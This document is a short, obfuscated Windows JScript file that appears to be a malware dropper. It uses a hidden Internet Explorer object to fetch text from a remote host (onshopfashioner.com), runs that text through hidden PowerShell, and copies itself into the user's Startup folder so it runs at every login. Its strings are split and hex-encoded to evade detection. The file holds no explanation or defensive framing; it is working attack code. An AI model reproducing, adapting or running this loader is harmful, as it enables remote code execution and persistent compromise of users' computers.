var ieObject  = WScript.CreateObject("Inter" + "netExpl" + "orer.Appl" + "ication");
ieObject.Visible  = false;

ieObject.Navigate("https://onshopfashioner.com/eca.txt");
while (ieObject.Busy || ieObject.readystate != 4)
WScript.Sleep(1000);

var fileContent=ieObject.document.documentElement.outerText;



runCommand(getShell() + fileContent)


if (getFileName() == getStartupFolder()) {

} else {
  command= getShell() + "Move-Item '" + getFileName() + "' '" + getStartupFolder() + "'"

runCommand(command)
}




function getFileName()

{

var scriptFullName='WSc' + 'ript.Sc' + 'riptF' + 'ullN' + 'ame'

return eval(scriptFullName)
}

function getStartupFolder()
{
var currentUser=GetObject(getCLSID())
var userName=eval(getUserName())
var startupFolder=("C:\\Users\\" + userName + getStartupFolderSuffix())
return startupFolder
}



function getCLSID()

{
	
	var clsid=["new:09","3FF999-1EA0-407","9-9525-9614C3504B74"];
	return clsid.join("");
}

function getShell()
{

return "Powersh" + "ell "

}

function runCommand(command)
{
	var shell=new ActiveXObject("wsc" + "ript.sh" + "ell")
	
	eval('shell.R' + 'un(command,0)');
}


function getUserName()

{

return 'currentUser' + '.Us' + 'er' + 'Name'

}




function getStartupFolderSuffix()

{

return decodeHexString("5c5c417070446174615c5c526f616d696e675c5c4d6963726f736f66745c5c57") + getStartMenuProgramsStartupFolder()

}

function getStartMenuProgramsStartupFolder()

{

return "indows\\Start Menu\\Programs\\Startup\\"

}


function getFileName() {
    return eval(getStringSplitJoinCode());
}


function decodeHexString(hex) {
    var str = '';
    for (var i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}

function getStringSplitJoinCode()
{

return "str.split(WSc" + "ript.Scri" + "ptName).join('')"

}
